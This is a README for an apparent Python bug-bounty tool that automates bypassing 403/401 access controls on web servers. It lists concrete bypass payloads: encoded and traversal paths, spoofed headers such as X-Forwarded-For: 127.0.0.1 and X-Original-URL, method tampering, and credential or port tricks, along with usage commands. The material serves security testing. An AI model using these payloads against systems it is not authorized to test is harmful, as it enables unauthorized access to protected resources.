# 403 Bypass

> Automated 403/401 bypass testing. Chains path manipulation, header injection, verb tampering, and protocol tricks in one run. Zero dependencies — pure Python.

---

## Techniques

| Category | Count | Examples |
|----------|-------|---------|
| **Path Manipulation** | 50+ | Case, encoding, traversal, trailing chars, path params |
| **Header Injection** | 80+ | X-Forwarded-For, X-Original-URL, X-Admin, auth headers |
| **Verb Tampering** | 30+ | HEAD, OPTIONS, method override headers, arbitrary verbs |
| **Protocol/Port** | 20+ | Scheme switch, alt ports, IPv6 host, direct IP, credentials |

---

## Installation

```bash
git clone https://github.com/yourhandle/bypass-403
cd bypass-403
python3 bypass_403.py --help
```

Zero dependencies. Pure Python 3.6+.

---

## Usage

### Basic scan
```bash
python3 bypass_403.py -u "https://target.com/admin"
```

### With cookies (often needed for auth-based 403s)
```bash
python3 bypass_403.py -u "https://target.com/admin/users" \
  -c "session=abc123; role=user"
```

### Specific techniques only
```bash
# Only path tricks
python3 bypass_403.py -u "https://target.com/admin" --techniques path

# Path + headers (most effective combo)
python3 bypass_403.py -u "https://target.com/admin" \
  --techniques path headers
```

### Scan multiple URLs
```bash
python3 bypass_403.py -l forbidden_urls.txt -c "session=TOKEN"
```

### Full workflow with report
```bash
python3 bypass_403.py -u "https://target.com/admin" \
  -c "session=TOKEN" \
  --report \
  -o results.json
```

### Pipe-friendly — print only bypassed URLs
```bash
python3 bypass_403.py -u "https://target.com/admin" \
  --only-bypassed -q
```

---

## Technique Deep Dive

### Path Manipulation
```
/admin         → /Admin /ADMIN /AdMiN
/admin         → /%61dmin /%61%64%6d%69%6e (URL encoded)
/admin         → /%2561dmin (double encoded)
/admin         → /admin/ /admin. /admin%00 /admin%09
/admin         → /anything/../admin (traversal)
/admin         → //admin ///admin /./admin
/admin         → /admin;foo=bar /admin;.js
/admin         → /admin? /admin?.js /admin#bypass
```

### Header Injection
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Host: localhost
X-Admin: true
X-Internal: true
Authorization: Bearer admin
```

### Verb Tampering
```
GET /admin 403   →   HEAD /admin 200?
GET /admin 403   →   POST /admin 200?
GET /admin 403   →   X-HTTP-Method-Override: GET → 200?
GET /admin 403   →   PROPFIND /admin 200?
```

### Protocol Bypasses
```
https://target.com/admin   →   http://target.com/admin
https://target.com/admin   →   https://target.com:8443/admin
https://target.com/admin   →   https://admin:admin@target.com/admin
https://target.com/admin   →   https://1.2.3.4/admin (Host: target.com)
```

---

## Bug Bounty Tips

```
1. Find 403 endpoints in Burp proxy history / JS files
2. Run: python3 bypass_403.py -u URL -c YOUR_SESSION_COOKIE
3. High confidence bypass → critical/high severity
4. Document with:
   - Original request → 403
   - Bypass request → 200
   - Response body showing the protected content
5. CVSS: Broken access control is Top 1 on OWASP — typically 7.5-9.8
```

---

## GitHub Info

**Description:**
```
403/401 bypass automation — path manipulation, header injection, verb tampering, protocol tricks
```

**Topics:**
```
403-bypass, access-control-bypass, broken-access-control,
bug-bounty, penetration-testing, python, web-security, appsec, owasp
```

---

## License
MIT — For authorized testing only.
